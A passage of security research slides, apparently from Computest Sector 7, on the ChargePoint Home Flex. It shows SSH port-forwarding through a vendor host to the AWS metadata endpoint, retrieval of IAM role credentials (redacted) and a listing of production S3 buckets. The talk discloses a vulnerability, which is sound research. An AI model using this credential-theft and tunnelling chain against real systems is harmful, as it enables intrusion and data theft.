ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" -p 343 -N -T
-L 1337:127.0.0.1:20023
pandart@xiuq0o4yl57c2017.chargepoint.com
\```

**>>**

## Slide 91

##### **ChargePoint Home Flex**

\```
ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" -p 343 -N -T
-L 1337:google.com:80
pandart@xiuq0o4yl57c2017.chargepoint.com
\```

**>>**

## Slide 92

##### **ChargePoint Home Flex**

\```
ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" -p 343 -N -T
-L 1337:169.254.169.254:80
pandart@xiuq0o4yl57c2017.chargepoint.com
\```

**>>**

## Slide 93

##### **ChargePoint Home Flex**

###### **`$ curl http://localhost:1337/latest/meta-data/iam/securitycredentials/cp-prod-ota-servers-role`** {

**"Code"** : "Success", **"LastUpdated"** : "2024-01-25T20:21:21Z", **"Type"** : "AWS-HMAC", **"AccessKeyId"** : "ASIA[REDACTED:aws-access-key-id]", **"SecretAccessKey"** : "<key>", **"Token"** : "<token>", **"Expiration"** : "2024-01-26T02:28:42Z" }

**>>**

## Slide 94

\```
$ aws s3 ls
2020-03-27 16:17:02 aws-athena-query-results-022521842517-ca-central-1
2019-07-17 19:23:19 aws-athena-query-results-022521842517-eu-central-1
2020-06-26 07:15:33 aws-athena-query-results-022521842517-us-west-2
2022-09-21 08:52:30 aws-cloudtrail-logs-022521842517-c3dfcdde-debug-datalake
2022-01-20 14:21:52 aws-glue-assets-022521842517-us-west-2
2020-06-26 07:53:11 aws-glue-scripts-022521842517-us-west-2
2020-06-26 07:57:20 aws-glue-temporary-022521842517-us-west-2
2020-06-17 04:15:13 cf-templates-aws-deployer-2-cp-prod-ap-southeast-2
2020-06-10 04:11:10 cf-templates-aws-deployer-2-cp-prod-ca-central-1
2020-06-23 04:10:57 cf-templates-aws-deployer-2-cp-prod-eu-central-1
2020-06-17 04:15:13 cf-templates-aws-deployer-cp-prod-ap-southeast-2
2020-06-23 04:10:57 cf-templates-aws-deployer-cp-prod-eu-central-1
2020-07-01 13:45:27 cf-templates-aws-deployer-cp-prod-us-east-1
2020-06-26 12:17:56 cf-templates-aws-deployer-cp-prod-us-west-2
2020-06-17 04:16:26 cf-templates-fg3iuljzn1mh-ap-southeast-2
2020-06-10 04:11:28 cf-templates-fg3iuljzn1mh-ca-central-1
2020-06-23 04:12:10 cf-templates-fg3iuljzn1mh-eu-central-1
2020-06-18 03:55:58 cf-templates-fg3iuljzn1mh-us-east-2
2020-06-26 12:23:09 cf-templates-fg3iuljzn1mh-us-west-2
2020-06-27 08:06:20 config-bucket-cp-prod
2019-07-19 11:36:28 cp-infra-logs
2020-07-02 15:38:44 cp-prod-022521842517-cloudtrail-logs
2020-03-27 10:51:52 cp-prod-ca-datalake
2022-02-17 01:52:33 cp-prod-cardconf
2020-06-27 08:26:51 cp-prod-datalake-build-artifacts
2021-08-18 02:19:20 cp-prod-fra-nos-notification-configuration
2022-02-24 09:36:38 cp-prod-fra-nos-pricing
2022-04-02 23:15:49 cp-prod-fra-nos-reports
\```

\```
...
\```

**>>**

## Slide 95

**>>**

## Slide 96

**<u>https://sector7.computest.nl @sector7_nl</u>**

**>>**
